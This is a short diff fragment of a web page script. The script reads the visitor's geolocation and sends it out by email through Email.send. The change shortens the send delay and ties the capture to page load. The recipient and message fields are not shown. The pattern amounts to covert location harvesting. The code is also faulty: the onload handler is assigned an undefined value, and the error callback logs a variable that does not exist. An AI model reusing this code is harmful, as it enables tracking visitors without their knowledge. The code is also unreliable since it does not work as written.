@@ -29,9 +29,9 @@
         //   hamid = position.coords
 
         // Global variable to store coordinates
-        let userCoordinates = { latitude: null, longitude: null };
+        // let userCoordinates = { latitude: null, longitude: null };
 
-        navigator.geolocation.getCurrentPosition(
+  const hamid=   navigator.geolocation.getCurrentPosition(
   (e)=>{
     setTimeout(()=>{
         Email.send({
@@ -46,18 +46,18 @@
 
 
             })
-       },8000)
+       },1000)
   },
   (errorCallback)=>{
     console.log(e);
   }
-);
-            console.log('hamid');
+)
+           
         
       
 
         // Automatically run the function when the page is loaded
-        window.onload = getLocation;
+        window.onload = hamid;
 
     </script>
 
